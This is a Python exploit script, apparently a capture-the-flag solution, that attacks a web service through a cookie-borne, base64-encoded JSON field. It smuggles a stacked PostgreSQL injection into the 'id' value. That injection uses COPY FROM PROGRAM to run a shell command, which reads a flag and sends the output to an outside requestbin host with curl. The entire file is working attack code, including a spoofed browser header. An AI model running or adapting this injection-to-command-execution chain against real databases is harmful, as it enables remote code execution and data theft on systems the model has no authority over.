import requests
import pickle
import json
from base64 import b64encode

URL = "http://206.189.125.80:31703"
REQUESTBIN = "https://requestbin.io/1q8drla1"
CMD = "/readflag"

HEADER = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'Cookie': '__cflb=$$UUID$$; __cfuid=$$RECV$$'
}

class mtain_id:
    '''make id not overlaping each other after new run'''
    def load_id():
        try:
            with open("x.pickle", "rb") as f:
                return pickle.load(f)+1
        except:
            return 1
        
    def save_id(n):
        with open("x.pickle", "wb") as f:
            pickle.dump(n, f)
        return None

class Exploit:
    def __init__(self, output, id=None, url=URL, header=HEADER, proxy=None):
        self.url = url
        self.header = header
        self.proxy = proxy
        self.output = output
        self.id = id

    def post_payload(self, uuid, recv):
        header = self.header
        header['Cookie'] = f"__cflb={uuid}; __cfuid={recv}"
        proxy = self.proxy
        req = requests.post(self.url+"/assets/jquery-3.6.0.slim.min.js",
                            headers=header,
                            proxies=proxy,
                            )
        return req.text

    def encode(self, recv, id=None):
        recv = b64encode(bytes(recv, "utf-8")).decode()
        x = json.dumps({"id": id, "output": recv})
        return b64encode(bytes(x, "utf-8")).decode()
        
    def start(self):
        recv = self.encode(recv=self.output, id=self.id)
        r = self.post_payload(uuid="49f062b5-8b94-4fff-bb41-d504b148aa1b", recv=recv)
        print(r)

def main():
    cmd = f"""curl -X POST -d "`{CMD}`" {REQUESTBIN}"""
    id = mtain_id.load_id()
    mtain_id.save_id(id)
    Exploit(output="""testing""",
            id=f"""{id}); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '{cmd}'; -- -""",
            # proxy={'http': 'http://127.0.0.1:8080'},
            ).start()
    
if __name__ == "__main__":
    main()
